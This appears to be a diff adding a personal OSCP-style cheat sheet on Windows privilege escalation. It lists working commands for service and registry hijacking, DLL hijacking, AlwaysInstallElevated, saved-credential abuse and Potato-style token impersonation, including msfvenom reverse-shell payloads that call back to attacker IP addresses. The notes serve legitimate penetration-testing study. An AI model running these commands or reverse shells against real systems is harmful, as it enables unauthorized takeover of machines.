@@ -1,0 +1,100 @@
+Winpeas and accesschk.exe will be our tools. Powerup.ps1 and sharpup can also be used
+
+Kernel Exploits:
+- Must be a last resort
+- Windows exploit suggestor - NG can be used to suggest exploits.
+python wes.py /tools/systeminfo.txt -i 'Elevation of Privelege' --exploits-only
+	- once have the result we can cross check with Sec Wiki pre compiled binaries for potential matches and may use them. 
+- Precompiled binaries on Sec Wikis github project
+- Watson can be used to enumerate recent version of windows.
+
+
+Service Exploits:
+
+a- Insecure Service PErmissions:
+	- If we can change the service configuration and restart the service running with system priveleges then we might have a priv esc route.
+	- Winpeas will highlight if we can modify any service.
+	- Can be verified from: .\accesschk.exe /accepteula -uwcqv user <service_name>
+	- Query service configuration with: sc qc <service_name>
+	- To query current state of servie: sc query <service_name>
+	- To modify path of the service: sc config <service_name> binpath= "C:\PrivEsc\reverse.exe\"
+	- To start a service: net start <service_name>
+b- Unquoted Service Path:
+	- Winpeas will highlight it.
+	- First check our permissions on that particular service to see if we can restart the serivce with: .\accesschk.exe /accepteula -ucqv user <service_name>
+	- Now run accesschk to see for write permissions on each binary path of the highlighted path like below:
+		- .\accesschk.exe /accepteula -uwdq C:\	
+		- .\accesschk.exe /accepteula -uwdq "C:\Program Files"	
+		- .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
+	- Once we have a path where we can write in the unquoted service path, we can copy our reverse shell and rename it as per the unquoted service path.
+c- Weak registry permissions:
+	- If we can modify the registry entries of a service, we can get a reverse shell by modifying "ImagePath" of any service.
+	- Winpeas will highlight it.
+	- First we need to confirm if we can modify the registry entry of a service by acceschk or powershell: .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+	- Then check if we have start and stop permission of that service: .\accesschk.exe /accepteula -ucqv user "service_name"
+	- Query the current values of the registry values of a service: reg query HKLM\System\CurrentControlSet\Services\regsvc
+	- Modify the bin path: reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+	- Restart the service: net start regsvc
+d- Insecure Service Executeables:
+	- If the original service executeable is modifiable by our user, we can simple replace it with our reverse shell and restart the service.
+	- Winpeas will highlight as "File Permissions: Everyone"
+	- We can verify result with accesschk: .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\fileperservice.exe"
+	- Check if we can stop or start the service: .\accesschk.exe /accepteula -uvqc <service_name>
+	- Copy our reverse shell and overwrite service executeable: copy /Y <path to reverse.exe> <path of service.exe>
+	- Restart the service: net start service.exe
+e- DLL Hijacking:
+	- If we can right in PATH folders of Windows environment, then there is a fair chance of DLL hijacking. It will be highlighted by WinPeas.
+	- Process is very manual an we have to manually check non windows binaries to check on which services we have stop and start access to.
+	- Once found a particular service on which we had start and stop access, copy the executeable over the Windows VM and analyse through ProcMon64.
+	- Generate a reverse shell with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=443 -f dll -o hijack.dll
+	- Replace the hijack dll on to the specified path in procmon and restart the service.
+
+
+Registry Exploits:
+	- AutoRun programs are highly unlikely in oscp as they require reboot, so I am skipping it.
+	1- AlwaysInstallElevated:
+		- If AlwaysInstallElevated is 1 in both HKLM and HKCU then this vulnerability can be exploited.
+		- To exploit it, generate a msi rev shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.119 LPORT=443 -f msi -o shell.msi
+		- Copy the reverse.msi over to Windows machine and then just execute it: msiexec /quiet /qn /i shell.msi
+
+Passwords:
+	- Just read output of winpeas attentively.
+	- winexe command can be used from kali to spawn a root shell: winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
+	- windows allows user to run commands on behalf of other users by runas. If credentials of other users are stored then this can be exploited. 
+	- To confirm we can use: cmdkey /list
+	- runas /savedcred /user:admin C:\PrivEsc\rev.exe
+	- Configuration files(web.config, unattend.xml).
+
+Scheduled Tasks:
+	- cmd command to get scheduled tasks: schtasks /query /fo LIST /v
+	- PS command version: Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft Taskname,TaskPath,State
+	- Once we have scheduled task like, use accesschk to confirm write privs.
+
+Installed Apps:
+	- Use seatbelt.exe to show non standard installation which we can look of public exploits.
+	- procesinfo flag in winpeas do the same. 
+
+Hot Potato:
+	- Works on windows 7, 8 and earlier versions of windows 10 and their server counter parts.
+	- Command: ./potato.exe -ip victim-ip -cmd "C:\PrivEsc\rev.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true
+
+Token Impersonation:
+	- If we get a reverse shell from a service account, then chances of this attack will be higher.
+	- Command to check if SeImpersonatePrivelege Enabled or not and SeAssignPrimaryTokenPrivelege is Disabled: whoami /priv
+	- We need to have available port and valid CLS ID to let this attack run succesfully. List is available on Juicy potato github and there is PS script as well to enumerate this.
+	- Command: Juicypotato.exe -l 1337 -p C:\Privesc\rev.exe -t * -c {CLS-ID} 
+	- PrintSpoofer is a new exploit. Command: PrintSpoofer.exe -i -c "C:\PrivEsc\rev.exe"
+  
+  ===============================================================================================================================================================================
+  Strategy:
+  
+  1- Read through Winpeas commands thoroughly and take notes of everything that seems odd, so we may look them at a later time. 
+  2- Make a checklist of things you require for a particular technique to work. Like if we can write to a system level service but cannot restart the service, it is probably not the intended way.
+  3- Try Service Exploits, Registry Exploits and Passwords in Config files first and then move towards Kernel Exploit if nothing seems to be working.
+  4- If our current user is a service account, then Token Impersonation technique has higher chances to work.
+  5- You've got it.
+  
+  
+  
+  
+  
